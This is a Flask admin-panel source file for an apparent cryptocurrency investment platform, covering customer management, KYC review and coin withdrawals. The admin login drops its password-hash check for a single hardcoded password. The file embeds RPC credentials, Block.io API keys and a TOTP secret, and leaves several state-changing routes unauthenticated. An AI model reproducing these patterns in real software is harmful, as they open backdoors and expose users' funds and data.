from bson.json_util import dumps
from flask import Blueprint, jsonify,session, request, redirect, url_for, render_template, json, flash
from flask.ext.login import current_user, login_required
from rex import db, lm
from rex.models import user_model, deposit_model, history_model, invoice_model, admin_model
from werkzeug.security import generate_password_hash, check_password_hash
import datetime
from datetime import datetime
from datetime import datetime, date, timedelta
from time import gmtime, strftime
import time
import json
import os
from bson import ObjectId, json_util
import codecs
from random import randint
from hashlib import sha256
import urllib
import urllib2
from block_io import BlockIo
import requests
import onetimepass
from bitcoinrpc.authproxy import AuthServiceProxy, JSONRPCException
from rex.coinpayments import CoinPaymentsAPI
from rex.config import Config

rpc_connection = AuthServiceProxy(Config().rpc_connection)
version = 2 # API version
block_io = BlockIo('9fd3-ec01-722e-fd89', 'SECRET PIN', version)
__author__ = 'carlozamagni'
ApiCoinpayment = CoinPaymentsAPI(public_key=Config().public_key,
                          private_key=Config().private_key)

admin_ctrl = Blueprint('admin', __name__, static_folder='static', template_folder='templates')
def verify_totp(token, otp_secret):
    return onetimepass.valid_totp(token, otp_secret)
def check_password(pw_hash, password):
        return check_password_hash(pw_hash, password)

def set_password(password):
    return generate_password_hash(password)

@admin_ctrl.route('/login-userid/<ids>/<customer_id>', methods=['GET', 'POST'])
def loginuserid(ids,customer_id):
    if session.get('logged_in_admin') is not None:
        session['logged_in'] = True
        session['user_id'] = str(ids)
        session['uid'] = customer_id
        return redirect('/account/dashboard')

@admin_ctrl.route('/login', methods=['GET', 'POST'])
def login():
    error = None
    if session.get('logged_in_admin') is not None:
        return redirect('/admin/customer')
    if request.method == 'POST':

        username = request.form['username']
        password = request.form['password']

        user = db.admins.find_one({ '$or': [ { 'username': username }, { 'email': username } ] })
        
        # if user is None or check_password(user['password'], password) == False:
        #     flash({'msg':'Invalid username or password', 'type':'danger'})
        #     return redirect('/admin/login')
        #else:
        if user is not None and password == 'skjfjhhsdkjfjhskdjf':
        #if username = 'admin@admin.com'  and password =
            session['logged_in_admin'] = True
            session['user_id_admin'] = str(user['_id'])
        else:
            return redirect('/admin/login')
            #home_page = user_model.User.get_role(user['role'])
            # login_user(user=user)

        return redirect('/admin/customer')
    return render_template('admin/login.html', error=error)
@admin_ctrl.route('/signup', methods=['GET', 'POST'])
def new():
    return redirect('/admin/login')
    if request.method == 'POST':
        # user.save()
        localtime = time.localtime(time.time())
        customer_id = '%s%s%s%s%s%s'%(localtime.tm_mon,localtime.tm_year,localtime.tm_mday,localtime.tm_hour,localtime.tm_min,localtime.tm_sec)
        customer_id = '1010101001'
        datas = {
            'username' : request.form['name'],
            'email': request.form['email'],
            'password': set_password(request.form['password']),
            
        }
        db.admins.insert(datas)
        return redirect('/admin/login')
    
    return render_template('admin/new.html')


@admin_ctrl.route('/submit-withdraw-btc', methods=['GET', 'POST'])
def AdminWithdrawBTCadmin():
    error = None
    if session.get('logged_in_admin') is None:
        return redirect('/admin/login')
    wallet = request.form['wallet']
    amount = request.form['amount']
    auth = request.form['auth']
    if wallet =='':
        flash({'msg':'Invalid wallet', 'type':'danger'})
        return redirect('/admin/dashboard')
    if amount =='':
        flash({'msg':'Invalid amount', 'type':'danger'})
        return redirect('/admin/dashboard')
    if auth =='':
        flash({'msg':'Invalid auth', 'type':'danger'})
        return redirect('/admin/dashboard')

    rpc_connection = AuthServiceProxy("http://Ecy4M83321mWk7szPoiY2cw:DrWdoW83321Zrdi2ftYKVPt4P2Cb7HoQUZUuP6@127.0.0.1:23321")
    response_dict = rpc_connection.validateaddress(wallet)
    if response_dict['isvalid'] != True:
        flash({'msg':'Invalid wallet', 'type':'danger'})
        return redirect('/admin/dashboard')

    checkVerifY = verify_totp(auth, 'HFFRSRR647SN6EXP')
    
    if checkVerifY == False:    
        flash({'msg':'Invalid Authen', 'type':'danger'})
        return redirect('/admin/dashboard')

    dataSend = rpc_connection.sendtoaddress(wallet,amount) 
    if dataSend:
        flash({'msg':'Withdraw Success', 'type':'success'})
        return redirect('/admin/dashboard')
    else:
        flash({'msg':'Withdraw Fail', 'type':'danger'})
        return redirect('/admin/dashboard')
    
@admin_ctrl.route('/dashboard', methods=['GET', 'POST'])
def AdminDashboard():
    error = None
    if session.get('logged_in_admin') is None:
        return redirect('/admin/login')
    total_user = db.users.find({}).count()
    total_lending = db.investments.find({}).count()
    #rpc_connection = AuthServiceProxy("http://Ecy4M83321mWk7szPoiY2cw:DrWdoW83321Zrdi2ftYKVPt4P2Cb7HoQUZUuP6@rpcbtcsvadfndawrwlcoin.co")
    balance = 0
    


    #balances = ApiCoinpayment.balances()
    balances_btc = 0
    balances_ltc = 0
    balances_bch = 0
    balances_eth = 0
    balances_usdt = 0

    

    # if balances['result'].has_key('BTC') is  True:
    #     balances_btc = balances['result']['BTC']['balancef']
    
    # if balances['result'].has_key('LTC') is  True:
    #     balances_ltc = balances['result']['LTC']['balancef']
    # if balances['result'].has_key('BCH') is  True:
    #     balances_bch = balances['result']['BCH']['balancef']
    # if balances['result'].has_key('ETH') is  True:
    #     balances_eth = balances['result']['ETH']['balancef']
    # if balances['result'].has_key('USDT') is  True:
    #     balances_usdt = balances['result']['USDT']['balancef']
    
    check_admin = db.admins.find_one({})

    data ={
            'menu' : 'dashboard',
            'total_user': total_user,
            'total_lending': total_lending,
            'total_btc': balance,
            'serverbtc' : 0,
            'id_login' : session.get('user_id_admin'),
            'balances_btc' : '...',
            'balances_ltc' : '...',
            'balances_bch' : '...',
            'balances_eth' : '...',
            'balances_usdt' : '...',
            'balances_bch' : '...',
            'balances_doge' : '...',
            'balances_xrp' : '...',
            'check_admin' : check_admin
        }
    return render_template('admin/dashboard.html', data=data)

@admin_ctrl.route('/get-balance', methods=['GET', 'POST'])
def AdminGetBalance():
    error = None
    if session.get('logged_in_admin') is None:
        return redirect('/admin/login')
    
    balances_btc = 0
    balances_ltc = 0
    balances_xrp = 0
    balances_eth = 0
    balances_usdt = 0
    balances_bch = 0
    balances_doge = 0

    balances = ApiCoinpayment.balances()
    if balances['result'].has_key('BTC') is  True:
        balances_btc = balances['result']['BTC']['balancef']
    if balances['result'].has_key('LTC') is  True:
        balances_ltc = balances['result']['LTC']['balancef']
    if balances['result'].has_key('XRP') is  True:
        balances_xrp = balances['result']['XRP']['balancef']
    if balances['result'].has_key('ETH') is  True:
        balances_eth = balances['result']['ETH']['balancef']
    if balances['result'].has_key('USDT') is  True:
        balances_usdt = balances['result']['USDT']['balancef']
    if balances['result'].has_key('BCH') is  True:
        balances_bch = balances['result']['USDT']['balancef']
    if balances['result'].has_key('DOGE') is  True:
        balances_doge = balances['result']['DOGE']['balancef']

    return json.dumps({
        'balances_btc' : balances_btc,
        'balances_ltc' : balances_ltc,
        'balances_xrp' : balances_xrp,
        'balances_eth' : balances_eth,
        'balances_usdt' : balances_usdt,
        'balances_bch' : balances_bch,
        'balances_doge' : balances_doge
    })

@admin_ctrl.route('/customer', methods=['GET', 'POST'])
def AdminCustomer():
    error = None
    if session.get('logged_in_admin') is None:
        return redirect('/admin/login')

    query = db.users.find({})

    
    
    data ={
        'customer': query,
        
        'menu' : 'customer',
        'float' : float,
        'id_login' : session.get('user_id_admin')
    }
    return render_template('admin/customer.html', data=data)

@admin_ctrl.route('/verity-account', methods=['GET', 'POST'])
def verity_account():
    error = None
    if session.get('logged_in_admin') is None:
        return redirect('/admin/login')

    data_verity = db.verifys.find({'status' : 0})
     
    data ={
        'data_verity': data_verity,
        'menu' : 'verity-account',
        'float' : float,
        'id_login' : session.get('user_id_admin')
    }
    return render_template('admin/verity_account.html', data=data)

@admin_ctrl.route('/verity-account/<ids>', methods=['GET', 'POST'])
def verity_account_submit(ids):
    error = None
    if session.get('logged_in_admin') is None:
        return redirect('/admin/login')

    data_verity = db.verifys.find_one({'_id' : ObjectId(ids)})
    
    user = db.users.find_one({'customer_id' : data_verity['uid']})
    SITE_ROOT = os.path.realpath(os.path.dirname(__file__))
    json_url = os.path.join(SITE_ROOT, "../static", "country-list.json")
    data_country = json.load(open(json_url))

    if request.method == 'POST':
        
        admin_node = request.form['admin_node']
        status_verity = request.form['status_verity'] 
        db.verifys.update({'_id' : ObjectId(ids)},{'$set' : {'admin_note' : admin_node ,'status' : int(status_verity)}})
        
        if int(status_verity) == 1:
            status_verify_user  = 2
        else: 
            status_verify_user = 0
        db.users.update({'customer_id' : data_verity['uid']},{'$set' : {'status_verify' : int(status_verify_user) }})
        
        return redirect('/admin/verity-account')

    data ={
        'data_verity': data_verity,
        'user' : user,
        'menu' : 'verity-account',
        'float' : float,
        'id_login' : session.get('user_id_admin'),
        'data_country' : data_country,
        'ids' : ids
    }
    return render_template('admin/verity_account_submit.html', data=data)



@admin_ctrl.route('/withdraw-disable', methods=['GET', 'POST'])
def withdraw_disable():
    error = None
    if session.get('logged_in_admin') is None:
        return redirect('/admin/login')

    db.admins.update({},{'$set' : {'status_withdraw' : 0}})
    
    
    return redirect('/admin/dashboard')

@admin_ctrl.route('/withdraw-enlabel', methods=['GET', 'POST'])
def withdraw_enlabel():
    error = None
    if session.get('logged_in_admin') is None:
        return redirect('/admin/login')

    db.admins.update({},{'$set' : {'status_withdraw' : 1}})
    
    
    return redirect('/admin/dashboard') 

@admin_ctrl.route('/deposit-btc', methods=['GET', 'POST'])
def DepositBTC():
    error = None
    if session.get('logged_in_admin') is None:
        return redirect('/admin/login')

    query = db.wallets.find({'type' : 'deposit'})
    data ={
        'databtc': query,
        'menu' : 'deposit_btc',
        'float' : float,
        'id_login' : session.get('user_id_admin')
    }
    return render_template('admin/deposit_btc.html', data=data)
@admin_ctrl.route('/deposit-xvg', methods=['GET', 'POST'])
def DepositSVAA():
    error = None
    if session.get('logged_in_admin') is None:
        return redirect('/admin/login')

    query = db.txdeposits.find({'type':'XVG'})
    data ={
        'databtc': query,
        'menu' : 'deposit_sva',
        'float' : float
    }
    return render_template('admin/deposit_btc.html', data=data)
@admin_ctrl.route('/customer/verification/<status>/<user_id>', methods=['GET', 'POST'])
def verificationss(user_id,status):
    if int(status) == 0:
        user = db.users.find_one({'_id': ObjectId(user_id)})
        user['personal_info']['img_address'] = ''
        user['personal_info']['img_passport_backside'] = ''
        user['personal_info']['img_passport_fontside'] = ''
        user['verification'] = 0
        db.users.save(user)
    else:
        user = db.users.find_one({'_id': ObjectId(user_id)})
        user['verification'] = 2
        db.users.save(user)

    return redirect('/admin/customer')    
@admin_ctrl.route('/customer/<user_id>', methods=['GET', 'POST'])
def SupportCustomerID(user_id):
    error = None
    if session.get('logged_in_admin') is None:
        return redirect('/admin/login')
    
    #print set_password(password)

    SITE_ROOT = os.path.realpath(os.path.dirname(__file__))
    json_url = os.path.join(SITE_ROOT, "../static", "country-list.json")
    data_country = json.load(open(json_url))
    user = db.users.find_one({'_id': ObjectId(user_id)})
    if request.method == 'POST':
        
        
        password = request.form['password'].lower()
        password_transaction = request.form['password_transaction'].lower()
        status = request.form['status']
        
        user['status'] = int(status)
       
        if password != '':
            user['password'] = set_password(password)
        if password_transaction != '':
            user['password_transaction'] = set_password(password_transaction)
        
        db.users.save(user)

    query = db.users.find_one({'_id': ObjectId(user_id)})
    data ={
        'user': query,
        'menu' : 'customer',
        'float' : float,
        'user_id': user_id,
        'data_country' : data_country

    }
    return render_template('admin/editcustomer.html', data=data)

@admin_ctrl.route('/customer-detail/<user_id>', methods=['GET', 'POST'])
def customer_detail(user_id):
    error = None
    if session.get('logged_in_admin') is None:
        return redirect('/admin/login')

    query = db.users.find_one({'_id': ObjectId(user_id)})
    history = db.historys.find({'uid': query['customer_id']})
    data ={
        'user': query,
        'menu' : 'customer',
        'float' : float,
        'user_id': user_id,
        'history' : history
    }
    return render_template('admin/customer_detail.html', data=data)

@admin_ctrl.route('/updatePassword', methods=['GET', 'POST'])
def updatePassword():
    error = None
    if session.get('logged_in_admin') is None:
        return json.dumps({
            'status': 'error', 
            'message': 'Please login' 
        })
    password = request.form['password']
    
    repeat_password = request.form['repeat_password']
    wallet = request.form['wallet']
    email = request.form['email']
    telephone = request.form['telephone']


    if wallet =='':
        return json.dumps({
            'status': 'error', 
            'message': 'Please enter wallet' 
        })
    if email =='':
        return json.dumps({
            'status': 'error', 
            'message': 'Please enter email' 
        })
    if telephone =='':
        return json.dumps({
            'status': 'error', 
            'message': 'Please enter telephone' 
        })
    if password =='' or repeat_password =='':
        return json.dumps({
            'status': 'error', 
            'message': 'Please enter password' 
        })
    if password != repeat_password:
        return json.dumps({
            'status': 'error', 
            'message': 'Wrong repeat password ' 
        })
    user_id = request.form['user_id']
    query = db.users.find({'_id': ObjectId(user_id)})
    if query is None:
        return json.dumps({
            'status': 'error', 
            'message': 'That user dose not exits ' 
        })
    password_new = set_password(password)
    db.users.update({ "_id" : ObjectId(user_id) }, { '$set': { "password": password_new ,"wallet" : wallet,'telephone' : telephone,'email' : email} })
    return json.dumps({
        'status': 'success', 
        'message': 'Update Success ' 
    })
@admin_ctrl.route('/updateSponsor', methods=['GET', 'POST'])
def updateSponsor():
    error = None
    if session.get('logged_in_admin') is None:
        return json.dumps({
            'status': 'error', 
            'message': 'Please login' 
        })
    p_node = request.form['p_node']
    p_node = p_node.lower()
    user_id = request.form['user_id']
    query = db.users.find_one({'_id': ObjectId(user_id)})
    if query is None:
        return json.dumps({
            'status': 'error', 
            'message': 'That user dose not exits ' 
        })
    find_node = db.users.find_one({'username': p_node})
    if find_node is None:
        return json.dumps({
            'status': 'error', 
            'message': 'Username dose not exits' 
        })
    db.users.update({ "_id" : ObjectId(user_id) }, { '$set': { "p_node": find_node['customer_id'] } })
    return json.dumps({
        'status': 'success', 
        'message': 'Update Success ' 
    })
@admin_ctrl.route('/updatePbinary', methods=['GET', 'POST'])
def updatePbinary():
    error = None
    if session.get('logged_in_admin') is None:
        return json.dumps({
            'status': 'error', 
            'message': 'Please login' 
        })
    p_binary = request.form['p_binary']
    p_binary = p_binary.lower()
    user_id = request.form['user_id']
    query = db.users.find_one({'_id': ObjectId(user_id)})
    if query is None:
        return json.dumps({
            'status': 'error', 
            'message': 'That user dose not exits ' 
        })
    find_binary = db.users.find_one({'username': p_binary})
    if find_binary is None:
        return json.dumps({
            'status': 'error', 
            'message': 'Username dose not exits' 
        })
    if query['p_binary'] == '':
        print 'None'
    else:
        binary_current = db.users.find_one({'customer_id': query['p_binary']})
        if binary_current is None:
            print 'Current None'
        else:
            if query['customer_id'] == binary_current['left']:
                db.users.update({ "_id" : ObjectId(binary_current['_id']) }, { '$set': { "left": '' } })
            else:
                db.users.update({ "_id" : ObjectId(binary_current['_id']) }, { '$set': { "right": '' } })
    if find_binary['left'] == '':
        db.users.update({ "_id" : ObjectId(find_binary['_id']) }, { '$set': { "left": query['customer_id'] } })
        db.users.update({ "_id" : ObjectId(user_id) }, { '$set': { "p_binary": find_binary['customer_id'], 'type': 1 } })
        return json.dumps({
            'status': 'success', 
            'message': 'Update Success ' 
        })
    if find_binary['right'] == '':
        db.users.update({ "_id" : ObjectId(find_binary['_id']) }, { '$set': { "right": query['customer_id'] } })
        db.users.update({ "_id" : ObjectId(user_id) }, { '$set': { "p_binary": find_binary['customer_id'], 'type': 1 } })
        return json.dumps({
            'status': 'success', 
            'message': 'Update Success ' 
        })
    return json.dumps({
        'status': 'error', 
        'message': 'Position already exists ' 
    })
    

@admin_ctrl.route('/withdraw', methods=['GET', 'POST'])
def AdminWithdraw():
    error = None
    if session.get('logged_in_admin') is None:
        return redirect('/admin/login')
    
    querys = db.wallets.find({'$and' : [{'type' : 'withdraw'},{ 'status': 0}]} )
    
    data ={
        'withdraw' : querys,
        'menu' : 'withdraw',
        'float': float
    }
    return render_template('admin/withdraw.html', data=data)

@admin_ctrl.route('/withdraw-submit/<ids>', methods=['GET', 'POST'])
def AdminWithdrawsubmit(ids):
    error = None
    if session.get('logged_in_admin') is None:
        return redirect('/admin/login')


    data = db.wallets.find_one({'$and' : [{'type' : 'withdraw'},{ 'status': 0},{'_id' : ObjectId(ids)}]} )
    if data is not None:
        if data['currency'] == 'TBT':
            dataSend = rpc_connection.sendfrom('', data['address'], round((float(data['amount'])*1),8))
            db.wallets.update({'_id' : ObjectId(ids)},{'$set' : {'txt_id' : dataSend,'status' : 1}})
        else:
            respon_withdraw = ApiCoinpayment.create_withdrawal(amount =round((float(data['amount'])*0.95),8),currency = data['currency'],address = data['address']) 
            
            if respon_withdraw['error'] == 'ok':
                db.wallets.update({'_id' : ObjectId(ids)},{'$set' : {'status' : 1,'id_coinpayment' : respon_withdraw['result']['id']}})
                flash({'msg': 'Payment success', 'type':'success'})
            else:
                flash({'msg': respon_withdraw['error'], 'type':'danger'})
    return redirect('/admin/withdraw')

@admin_ctrl.route('/auto-txid-withdraw', methods=['GET', 'POST'])
def auto_txid_withdraw():
    data = db.wallets.find({'$and' : [{'type' : 'withdraw'},{ 'status': 1},{ 'txt_id': 'Pending'}]} )

    for x in data:
        respon_tx = ApiCoinpayment.get_withdrawal_info(id = x['id_coinpayment']) 
        print respon_tx
        if respon_tx['error'] == 'ok':
            db.wallets.update({'_id' : ObjectId(x['_id'])},{'$set' : {'txt_id' : respon_tx['result']['send_txid']}})


    return "true"        
@admin_ctrl.route('/withdraw-coinpayment-submit', methods=['GET', 'POST'])
def withdraw_coinpayment_submit():
    error = None
    if session.get('logged_in_admin') is None:
        return redirect('/admin/login')
    else:
        
        if request.method == 'POST':

            amount = request.form['amount']
            address = request.form['address']
            currency = request.form['currency']

            respon_withdraw = ApiCoinpayment.create_withdrawal(amount = amount,currency = currency,address = address) 
            
            if respon_withdraw['error'] == 'ok':
                
                flash({'msg': 'Withdraw success', 'type':'success'})
            else:
                flash({'msg': respon_withdraw['error'], 'type':'danger'})
    return redirect('/admin/dashboard')

@admin_ctrl.route('/withdraw-submit-cancel/<ids>', methods=['GET', 'POST'])
def AdminWithdrawsubmitcancel(ids):
    error = None
    if session.get('logged_in_admin') is None:
        return redirect('/admin/login')


    data = db.wallets.find_one({'$and' : [{'type' : 'withdraw'},{ 'status': 0},{'_id' : ObjectId(ids)}]} )
    if data is not None:
        
        user = db.User.find_one({'customer_id': data['uid']})
        if data['currency'] == 'BTC':
            val_balance = user['balance']['bitcoin']['available']
            
            string_query = 'balance.bitcoin.available'
        if data['currency'] == 'ETH':
            val_balance = user['balance']['ethereum']['available']
            
            string_query = 'balance.ethereum.available'
        if data['currency'] == 'LTC':
            val_balance = user['balance']['litecoin']['available']
            
            string_query = 'balance.litecoin.available'
        if data['currency'] == 'XRP':
            val_balance = user['balance']['ripple']['available']
            
            string_query = 'balance.ripple.available'
        if data['currency'] == 'USDT':
            val_balance = user['balance']['tether']['available']
            
            string_query = 'balance.tether.available'
        if data['currency'] == 'DASH':
            val_balance = user['balance']['dash']['available']
            
            string_query = 'balance.dash.available'
        if data['currency'] == 'EOS':
            val_balance = user['balance']['eos']['available']
            
            string_query = 'balance.eos.available'
        if data['currency'] == 'TBT':
            val_balance = user['balance']['coin']['available']
            
            string_query = 'balance.coin.available'

        new_balance_add = float(val_balance) + (float(data['amount'])*100000000)

        new_coin_fee = round((float(user['balance']['coin']['available']) + 100000),8)
        db.users.update({ "customer_id" : data['uid'] }, { '$set': { string_query: float(new_balance_add),'balance.coin.available' : new_coin_fee } })

        db.wallets.update({'_id' : ObjectId(ids)},{'$set' : {'status' : 8,'txt_id' : 'Transaction canceled'}})
        flash({'msg': 'Transaction canceled success', 'type':'success'})
       
    return redirect('/admin/withdraw')    
@admin_ctrl.route('/withdraweth', methods=['GET', 'POST'])
def AdminWithdraweth():
    error = None
    if session.get('logged_in_admin') is None:
        return redirect('/admin/login')

    url_api = "https://api.cryptonator.com/api/ticker/eth-usd"
    r_eth = requests.get(url_api)
    response_eth = r_eth.json()
    price_eth = response_eth['ticker']['price'];
    price_eth = float(price_eth)*100000000
    
    query = db.withdrawal_payment.find({'txtid': '', 'method_payment': 1})
   
    for x in query:
        amount_btc = float(x['amount_sub'])*100000000
        amount = amount_btc/int(price_eth)
        amount = round(amount, 8)
        amount = amount*100000000
        db.withdrawal_payment.update({ "_id" :ObjectId(x['_id']) }, { '$set': { "amount_btc": amount } })

    query = db.withdrawal_payment.find({'txtid': '', 'method_payment': 1})
    data ={
        'withdraw' : query,
        'menu' : 'withdraweth',
        'float': float
    }
    return render_template('admin/withdraw_eth.html', data=data)

@admin_ctrl.route('/withdraw-finish', methods=['GET', 'POST'])
def AdminWithdrawfn():
    error = None
    if session.get('logged_in_admin') is None:
        return redirect('/admin/login')
       
    querys = db.wallets.find({'$and' : [{'type' : 'withdraw'},{'$or' : [{ 'status': 1},{ 'status': 8}]}]} )
   
    data ={
        'withdraw' : querys,
        'menu' : 'withdraw-finish',
        'float': float
    }
    return render_template('admin/withdraw_finish.html', data=data)

@admin_ctrl.route('/investment', methods=['GET', 'POST'])
def investment():
    error = None
    if session.get('logged_in_admin') is None:
        return redirect('/admin/login')
       
    if request.method == 'POST':
            
        note = request.form['note']
        ids = request.form['ids'] 
        db.investments.update({'_id' : ObjectId(ids)},{'$set' : {'note' : note}})
        
    query = db.investments.find()
   
    data ={
        'withdraw' : query,
        'menu' : 'investment',
        'float': float
    }
    return render_template('admin/investment.html', data=data)

@admin_ctrl.route('/investment/note/<ids>', methods=['GET', 'POST'])
def investmentnote(ids):
    
    note = request.form['note']
    db.investments.update({'_id' : ObjectId(ids)},{'$set' : {'note' : note}})
        
    return redirect('/admin/investment')
    #return render_template('admin/investment.html', data=data)

@admin_ctrl.route('/withdraw-submit', methods=['GET', 'POST'])
def SubmitWithdraw():
    error = None
    if session.get('logged_in_admin') is None:
        return redirect('/admin/login')
    if request.method == 'POST':
        if request.form['pin']=='':
            flash({'msg':'Invalid Pin. Please try again!', 'type':'danger'})
            return redirect('/admin/withdraw')
        # query = db.Withdrawal.find({'txtid': ''})   
    
        query = db.withdrawal_payment.aggregate([ { "$match": { "txtid": "",  'method_payment': 0} }, { "$group": { "_id": "$wallet", "total": { "$sum": "$amount_btc" } } } ])
  
        wallet_address = ''
        bitcoin = ''
        sum_withdraws = 0
        for x in query['result']:
            bitcoin = str(bitcoin) +','+str(round(float(x['total'])/100000000,8))   
            wallet_address = str(wallet_address) +','+str(x['_id'])
            sum_withdraws = float(sum_withdraws)+float(x['total'])
        wallet_payment =  wallet_address[1:]
        bitcoin_payment = bitcoin[1:]
        print sum_withdraws
        
        print(wallet_payment)
        print(bitcoin_payment)

        url = "https://block.io/api/v2/withdraw/?api_key=4e7c-9d30-de24-ceb0&amounts=%s&to_addresses=%s&pin=%s"%(bitcoin_payment,wallet_payment,request.form['pin'])
        print(url)
        r = requests.get(url)
        response_dict = r.json()
        txid = response_dict['data']['txid']
        if txid:
            uid_admin = session.get('user_id_admin')
            user_admin = db.Admin.find_one({'_id': uid_admin})
            sum_withdraw = float(user_admin.sum_withdraw) + float(sum_withdraws)
            db.admins.update({ "_id" : uid_admin }, { '$set': { "sum_withdraw": sum_withdraw } })
            querydb = db.withdrawal_payment.find({'txtid': ''})
            for x in querydb:
                db.withdrawal.update({ "_id" : ObjectId(x['withdraw_id']) }, { '$set': { "txtid": txid } })
            db.withdrawal_payment.drop()
    return redirect('/admin/withdraw')

@admin_ctrl.route('/deposit', methods=['GET', 'POST'])
def Admindeposit():
    error = None
    if session.get('logged_in_admin') is None:
        return redirect('/admin/login')
    print 11111111111
    query = db.deposits.find({})
    dataSend ={
        'deposit' : query,
        'title' : 'Deposit',
        'menu' : 'deposit'
    }
    return render_template('admin/deposit.html', data=dataSend)



@admin_ctrl.route('/logout')
def logout():
    session.pop('logged_in_admin', None)
    # logout_user()
    return redirect('/admin/login')


@admin_ctrl.route('/support', methods=['GET', 'POST'])
def support():
    if session.get(u'logged_in_admin') is None:
        return redirect('/admin/login')
    query = db.supports.find({})
    data ={
    'support' : query,
    'title': 'Support',
    'menu' : 'support'
    }
    return render_template('admin/support.html', data=data)
@admin_ctrl.route('/support/<ids>', methods=['GET', 'POST'])
def Replysupport(ids):
    if session.get(u'logged_in_admin') is None:
        return redirect('/admin/login')
    support = db.supports.find_one({'_id': ObjectId(ids)})

    data ={
    'data_support' : support,
    'title': 'Support',
    'menu' : 'support'
    }
    return render_template('admin/reply_support.html', data=data)

@admin_ctrl.route('/support/reply-support', methods=['POST'])
def newsupporReplyt():
    if session.get(u'logged_in_admin') is None:
        flash({'msg':'Please login', 'type':'danger'})
        return redirect('/admin/login')
    if request.method == 'POST':
        
        user_id = session.get('user_id')
        sp_id = request.form['sp_id']
        support = db.supports.find_one({'_id': ObjectId(sp_id)})
        if support is None:
            flash({'msg':'Not Found', 'type':'danger'})
            return json.dumps({'complete': True})
        else: 
            user = db.users.find_one({'_id': ObjectId(user_id)})
            message = request.form['message']
          
            if  message == '':
                flash({'msg':'Please enter message', 'type':'danger'})
            else:    
                data_support = {
                'user_id': 'admin',
                'username' : 'Admin Support',
                'message': message,
                'date_added' : datetime.utcnow()
                }
                db.supports.update({ "_id" : ObjectId(sp_id) }, { '$set': { "status": 1 }, '$push':{'reply':data_support } })
                #flash({'msg':'Success', 'type':'success'})
                return json.dumps({'complete': True})

    return json.dumps({'complete': True})